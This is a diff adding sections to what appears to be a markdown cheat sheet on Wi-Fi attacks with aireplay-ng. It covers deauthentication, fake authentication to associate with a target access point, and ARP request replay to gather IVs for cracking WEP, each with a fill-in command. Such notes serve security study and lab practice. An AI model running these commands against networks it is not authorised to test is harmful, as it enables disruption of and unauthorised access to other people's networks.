@@ -14,3 +14,20 @@ aireplay-ng --deauth <PACKET_AMOUNT> -a <TARGET_NETWORK_BSSID> -c <TARGET_STATIO
 ```
 
 If the command fails, run `airodump-ng` along with it, to sniff network with the `--target` flag.
+
+## Fake Authentication
+
+1. Sniff packets
+2. Use fake auth to associate with network and allow sending packets to network
+
+```
+aireplay-ng --fakeauth <REPS=0> -a <TARGET_MAC> -h <MY_INTERFACE_MAC> <MONITOR_INTERFACE_NAME>
+```
+
+## ARP Request Replay Attack
+
+Replaying ARP packets causes the AP to produce another packet with a new IV, which is usefull for cracking WEP.
+
+```
+aireplay-ng --arpreplay -b <TARGET_MAC> -h <MY_INTERFACE_MAC> <MONITOR_INTERFACE_NAME> 
+```
